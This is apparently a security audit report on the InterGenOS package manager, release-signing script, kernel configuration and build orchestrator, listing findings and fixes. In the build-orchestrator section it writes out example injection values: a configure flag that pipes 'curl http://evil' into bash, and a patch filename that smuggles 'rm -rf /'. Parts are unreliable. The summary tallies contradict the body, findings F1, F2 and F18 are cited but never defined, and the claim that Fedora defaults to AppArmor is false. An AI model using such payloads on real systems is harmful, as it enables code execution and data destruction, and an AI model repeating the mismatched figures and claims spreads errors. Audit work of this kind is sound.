# InterGenOS Code Security Audit — pkm + sign-release + Kernel Config

**Date:** 2026-04-29T20:04Z
**Auditor:** InterGenOS peer-driven code review
**Master target:** 4d1adc1

---

## Scope 1: pkm/ — Package Manager Trust Chain

### CRITICAL

#### C1.1 — GPG Verification Silently Skipped When Keyring Missing (CRITICAL)

**Files:** pkm/repo.py:179-184, pkm/repo.py:269-282

**Problem:** If /etc/pkm/trusted.gpg doesn't exist, signature verification is silently skipped. Repo index downloaded and trusted unverified. Effects: MITM injects malicious packages, trusted forever because _ensure_synced() loads cached .db from disk with zero re-verification.

**Fix:** FAIL CLOSED — if GPG_KEYRING doesn't exist, delete downloaded files and report failure. Re-verify signature when loading cached index from disk.

---

#### C1.2 — Partial Sync Failure Leaves Unverified Index on Disk (CRITICAL)

**Files:** pkm/repo.py:175-198

**Problem:** If .db download succeeds but .sig download fails, the .db stays on disk VERIFIEDLESS. Next sync cycle loads it without signature check.

**Fix:** Delete .db on any download failure. Wrap downloads in try/exclusive-finally.

---

### HIGH

#### H1 — SHA256 Verification Bypassed on Falsy Checksum (HIGH)

**Files:** pkm/repo.py:327-328

**Problem:** _verify_checksum() returns True for "", None, 0 — any falsy value. Attacker omits sha256 field in malicious index = no verification.

**Fix:** Return False for non-string / wrong-length checksums. Require 64-char hex.

---

#### H2 — Deploy Tar Missing Permission Hardening (HIGH)

**Files:** pkm/installer.py:90-94

**Problem:** Staging extraction uses --no-same-owner --no-same-permissions. Deploy extraction does NOT. Setuid binaries or world-writable files pass through.

**Fix:** Add --no-same-owner --no-same-permissions to deploy tar command.

---

#### H3 — --archive CLI Flag Bypasses Trust Chain Entirely (HIGH)

**Files:** pkm/cli.py:127-138, pkm/installer.py:19-115

**Problem:**`pkm install --archive evil.tar.gz` installs with zero integrity verification — no GPG, no SHA256, no manifest. _sha256 imported in installer.py but never called (dead code).

**Fix:** Require --checksum flag for local archives. Warn user when skipping repo verification.

---

### MEDIUM

- **M1:** No replay/downgrade protection on signed index (repo.py:187)
- **M2:** GPG verification doesn't pin expected signing key fingerprint (repo.py:211-218)
- **M3:** _download writes directly to dest — no atomic rename, truncated file risk (repo.py:202-209)
- **M4:** _parse_index has no schema validation or bounds checks (repo.py:220-224)
- **M5:** Installer doesn't verify archive content against manifest (installer.py:65-74)

### LOW

- **L1:** pkg['repo'] KeyError if repo config changes (repo.py:300-301)
- **L2:** sign_index uses default GPG key when none specified (repo.py:449)
- **L3:** Package name parsing fails for hyphenated names (repo.py:419)
- **L4:** Unused `available` table in database schema (database.py:56-67)

---

## Scope 2: scripts/sign-release.sh — Release Signing Script

### MEDIUM

#### SR1 — Partial-Signature State on Mid-Script Failure (MEDIUM)

**Lines:** 118-170

**Problem:** Three signing steps executed sequentially. If step 1 (GPG sign) succeeds but step 2 (sbsign kernel) fails, set -e aborts but GPG output already persists in $OUTPUT. A downstream tool seeing InterGenOS.db.sig as "done signal" would consume an incomplete release.

**Fix:** Sign to staging subdirectory, atomic mv to $OUTPUT only on full success. Trap ERR to clean staging.

---

#### SR2 — No Post-Signature Verification (MEDIUM)

**Lines:** 118-166, 179-181

**Problem:** gpg and sbsign produce output but never verified. gpg --verify and sbverify commands are printed as human-readable suggestions only — not executed. Filesystem corruption, PKCS#11 engine bug, cert/key mismatch propagate to image-creation phase undetected.

**Fix:** Call gpg --verify and sbverify after each sign step. Treat verification failure as hard signing failure.

---

#### SR3 — Vendor Signing Certificate Travels with Unsigned Artifacts (MEDIUM)

**Lines:** 143, 162

**Problem:** vendor-cert.pem rides in $ARTIFACTS dir alongside unsigned binaries. Transported across build VM → signing workstation channel. If channel compromised, attacker swaps cert, validly-signs with attacker's cert → shim verification failures in field.

**Fix:** Pre-position vendor-cert.pem on signing workstation at dedicated path. Validate cert against PKCS#11 key before signing.

---

### LOW

- **SR4:** TOCTOU token check → signing gap (lines 93-96, 118, 141, 160)
- **SR5:** TOCTOU file existence check → read gap (lines 116, 137, 158)
- **SR6:** Missing vendor-cert.pem pre-flight check (lines 143, 162)
- **SR7:** GPG key ID format not validated — short key ID possible (lines 60, 109)
- **SR8:** PKCS#11 URI format not validated (lines 61, 110, 142, 161)
- **SR9:** Terminal escape injection via echo with attacker-controlled args (lines 77, 83)
- **SR10:** Narrow p11tool brand detection (line 103)
- **SR11:** shopt -s nullglob unscoped (line 135)
- **SR12:** No ARTIFACTS/OUTPUT same-dir guard (lines 67-68, 88, 123, 144)

**Zero command injection vectors found.** All var expansions double-quoted. No eval, no backtick subshell.

---

## Scope 3: config/kernel/fragments/ — Kernel Kconfig Security Sweep

### CRITICAL

#### K1 — CONFIG_DEFAULT_SECURITY Not Set (CRITICAL)

**Problem:** Kernel boots with DAC only — no major Linux Security Module (LSM) active by default. SELinux, AppArmor, Yama, lockdown all compiled-in but NONE runs without manual `security=` boot parameter.

**Context:** Fedora: `CONFIG_DEFAULT_SECURITY="apparmor"`. Ubuntu: `CONFIG_DEFAULT_SECURITY="apparmor"`. Debian base: apparmor.

**Fix:**
```
CONFIG_DEFAULT_SECURITY="apparmor"
CONFIG_DEFAULT_SECURITY_APPARMOR=y
```

---

#### K2 — CONFIG_LSM Not Set (CRITICAL)

**Problem:** LSM init order unspecified. Fedora sets `CONFIG_LSM="lockdown,yama,integrity,apparmor"`. Without this, lockdown may initialize too late after kernel modules loaded — defeats the LOCK_DOWN_IN_EFI_SECURE_BOOT guarantee.

**Fix:** Add alongside DEFAULT_SECURITY. Match Fedora ordering.

---

#### K3 — CONFIG_IMA_SECURE_AND_OR_TRUSTED_BOOT Not Set (CRITICAL)

**Problem:** Integrity Measurement Architecture (IMA) compiled in but set to `DEFAULT_IMA_POLICY=tcb` (passive measure-only). Under Secure Boot, IMA should auto-activate appraise/secure-boot modes. This is the SAME PATTERN as Q17 (LOCK_DOWN_IN_EFI_SECURE_BOOT) — feature compiled in but doesn't auto-activate.

**Reference:** Fedora sets `CONFIG_IMA_SECURE_AND_OR_TRUSTED_BOOT=y`. Ubuntu: same.

**Fix:**
```
CONFIG_IMA_SECURE_AND_OR_TRUSTED_BOOT=y
CONFIG_IMA_ARCH_POLICY=y
CONFIG_IMA_APPRAISE_BOOTPARAM=y
```

---

### HIGH

Settings that reviewers would flag as "missing" from a shim-review submission. All are =y or builtin in Fedora ref config, not set or missing in InterGenOS baseline + overrides:

Setting | Fedora | InterGenOS | Function
---|---|---|---
IMA_APPRAISE_MODSIG | y | not set | Extends integrity to kernel modules
IMA_NG_TEMPLATE | y | not set | Modern IMA measurement format
IMA_LSM_RULES | y | not set | LSM-based IMA policy rules
IMA_QUEUE_EARLY_BOOT_KEYS | y | not set | Key import before policy load
IMA_KEYRINGS_PERMIT_SIGNED_BY_BUILTIN_OR_SECONDARY | y | not set | Key trust for builtin + secondary
INTEGRITY_CA_MACHINE_KEYRING_MAX | y | not set | Machine keyring fills the build-time cert → runtime gap
CRYPTO_FIPS | y | not set | FIPS 140-2 compliance mode
SYSTEM_EXTRA_CERTIFICATE | set | not set | Distro extra cert for secondary keyring

### MEDIUM

- 6 additional IMA and integrity settings with Fedora-mismatch, lower reviewer priority
- Some settings already correct: CONFIG_SECURITY_LOCKDOWN_LSM_EARLY= y ✓, CONFIG_MODULE_SIG_FORCE= y ✓

### ALREADY CORRECT

- CONFIG_LOCK_DOWN_IN_EFI_SECURE_BOOT — WAS missing, resolved at baf84d8 ✓
- CONFIG_SECURE_BOOT — y ✓
- CONFIG_MODULE_SIG — y ✓
- CONFIG_MODULE_SIG_FORCE — y ✓
- CONFIG_SYSTEM_TRUSTED_KEYS — already pointed at build key ✓

---

## Summary

| Scope | CRITICAL | HIGH | MEDIUM | LOW | Total |
|-------|----------|------|--------|-----|-------|
| pkm/ | 2 | 3 | 5 | 4 | 14 |
| sign-release.sh | 0 | 3 | 0 | 9 | 12 |
| kernel config | 3 | 8 | 6 | 2 | 19 |
| igos-build/ | 4 | 8 | 5 | 2 | 19 |
| **TOTAL** | **9** | **22** | **16** | **17** | **64** |

---

## Scope 4: igos-build/ — Build Orchestrator

### CRITICAL

#### B1 — Shell Injection via `configure_flags` (CRITICAL)

**Files:** styles/autotools.py:20-26, styles/cmake.py:16-23, styles/meson.py:16-25, styles/make.py:23-28

**Problem:** configure_flags from package.yml concatenated into shell commands with zero escaping. builder.py:199 uses shell=True. `configure_flags: "--prefix=/usr; curl http://evil|bash"` → command injection.

**Fix:** shlex.quote() each flag. Or switch to shell=False with argument lists.

---

#### B2 — Shell Injection via Patch Filenames (CRITICAL)

**Files:** styles/base.py:87-101

**Problem:** entry.file from YAML interpolated into echo/sha256sum/patch shell commands unquoted. `entry.file: "fix.patch\"; rm -rf /; echo \"` → code execution.

**Fix:** shlex.quote() all interpolations.

---

#### B3 — Tar Path Traversal: No `..` Sanitization on Extraction (CRITICAL)

**Files:** builder.py:306-310, builder.py:329-333

**Problem:** Zip extraction validates member paths. Tar extraction does NOT. Hostile tarball with `../etc/trojan.conf` escapes build tree. TAR_SAFETY handles UID/GID but NOT path traversal.

**Fix:** Pre-inspect tar members with tarfile module. Reject paths that escape src_dir.

---

#### B4 — DESTDIR Staging to `/` Path Traversal (CRITICAL)

**Files:** tracker.py:153-170

**Problem:** Package deployment extracts tar -C / -xf - with no `..` sanitization. build.sh creating `staging/../../etc/trojan` writes to real /etc/trojan. Root filesystem compromise, zero audit trail if combined with skip_tracking.

**Fix:** Walk staging tree before archiving. Reject any path resolving outside staging_dir.resolve().

---

### HIGH

- **B5:** Validation bypass via `fatal: false` — all validation checks non-blocking, silent pass
- **B6:** Check phase failures silently suppressed — ALL styles use `make check || true`
- **B7:** Host environment wholesale propagation — os.environ.copy() passes LD_PRELOAD, PYTHONPATH, secrets to every build
- **B8:** bundled_deps path traversal — dest_rel `../../../etc` escapes build tree
- **B9:** direct_install + skip_tracking = untraceable root writes — zero manifest, zero tracking, direct fs modification
- **B10:** Validation script shell=True with unsanitized check.script from package.yml

### MEDIUM

- **B11:** BuildPhase.env dead code (never applied to subprocess) — latent injection surface
- **B12:** No build command timeout — infinite loop hangs entire pipeline
- **B13:** Staging directory reuse without full cleanup — stale files from prior failed build
- **B14:** Patch file path traversal via entry.file containing `/`
- **B15:** Log file path traversal via package name containing `..`

### LOW

- **B16:** template_path TOCTOU for build.sh detection (race condition)
- **B17:** _build_sh_path falls back to CWD "build.sh" (latent injection, unreachable in production)
- **B18:** _resolve_variables unhandled KeyError crashes entire parse
- **B19:** Manifest format injection via description field newlines

### Cross-Cutting Recommendation

Switch from `shell=True` + string interpolation to `shell=False` + argument lists throughout builder.py. Eliminates F1, F2, F18, and most B1-B2 vectors at the architectural level. Current design trusts package.yml as input — shim-review defense-in-depth demands treating it as potentially hostile.

---

## Next Steps

1. **pkm/ C1.1 + C1.2** — CRITICAL trust-chain gaps, fix before unsigned-boot installers ship
2. **Kernel K1 + K3** — CRITICAL shim-review blockers, same class as Q17
3. **igos-build/ B1-B4** — CRITICAL shell injection + path traversal, fix before build system accepts third-party packages
4. **sign-release.sh SR1** — MEDIUM partial-signature gap, fix before ceremony signing
5. **Cross-cutting:** audit shell=True → shell=False migration feasibility across all 64 findings
